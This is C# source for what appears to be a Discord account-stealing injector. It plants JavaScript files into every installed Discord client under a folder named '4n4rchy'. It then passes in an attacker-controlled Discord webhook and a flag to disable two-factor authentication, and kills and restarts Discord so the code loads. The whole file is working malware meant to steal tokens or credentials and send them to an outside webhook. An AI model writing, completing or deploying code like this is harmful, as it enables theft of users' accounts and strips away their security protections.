using System;
using System.Diagnostics;
using System.IO;

namespace yikes
{
    class Program
    {
        static void Main()
        {
            OxygenFile injectFile = new OxygenFile("inject.js", Resources.inject);
            OxygenFile modFile = new OxygenFile("discordmod.js", Resources.discordmod);

            foreach (DiscordBuild build in Enum.GetValues(typeof(DiscordBuild)))
            {
                if (OxygenInjector.TryGetDiscordPath(build, out string path))
                {
                    string anarchyPath = Path.Combine(path, "4n4rchy");

                    if (Directory.Exists(anarchyPath))
                        Directory.Delete(anarchyPath, true);
                }

                if (OxygenInjector.Inject(build, "4n4rchy", "inject", $"process.env.hook = '{Settings.Webhook.Replace("https://discord.com/api/webhooks/", "").Replace("https://discordapp.com/api/webhooks/", "")}';\nprocess.env.mfa = {Settings.Disable2fa.ToString().ToLower()};", injectFile, modFile) && build == DiscordBuild.Discord)
                {
                    foreach (var proc in Process.GetProcessesByName("Discord"))
                        proc.Kill();

                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Discord Inc\Discord.lnk");
                }
            }
        }
    }
}
